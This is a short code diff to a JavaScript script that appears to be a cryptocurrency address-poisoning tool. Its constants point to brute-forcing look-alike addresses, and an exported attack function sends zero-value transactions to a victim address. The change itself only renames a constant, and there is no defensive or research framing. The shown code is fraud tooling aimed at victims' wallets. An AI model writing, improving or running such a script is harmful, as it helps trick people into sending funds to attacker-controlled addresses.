@@ -15,7 +15,7 @@ const START_POSITION = 3; // include 0x
 const END_POSITION = 3;
 const MAX_ATTEMPTS = 1000000; // Set a limit to the number of attempts
 const GAS_VALUE = "0.0003"; // Set the amount of gas to send
-const send_VALUE = "0"; // Set the amount of gas to send
+const SEND_VALUE = "0"; // Set the amount of gas to send
 
 const settings = {
   apiKey: ALCHEMY_API_KEY,
@@ -127,7 +127,7 @@ export async function attack({ victimAddress, transferAddress }) {
     });
     const attackHash = await client.sendTransaction({
       to: victimAddress,
-      value: parseEther(send_VALUE),
+      value: parseEther(SEND_VALUE),
       gasPrice: adjustedGasPrice,
     });
     console.log(`attack , attackHash is ${attackHash}`);
